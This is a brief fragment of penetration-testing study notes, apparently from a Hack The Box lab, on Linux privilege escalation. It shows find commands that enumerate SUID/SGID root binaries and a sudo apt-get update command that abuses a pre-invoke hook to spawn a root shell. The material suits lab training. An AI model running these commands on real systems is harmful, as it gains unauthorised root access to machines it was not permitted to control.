...
if a vulnerability is found in a SETUID binary then that can help uys escalate to root.
...
```shell-session
Hillside_1@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
...
```shell-session
Hillside_1@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
...
```shell-session
Hillside_1@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
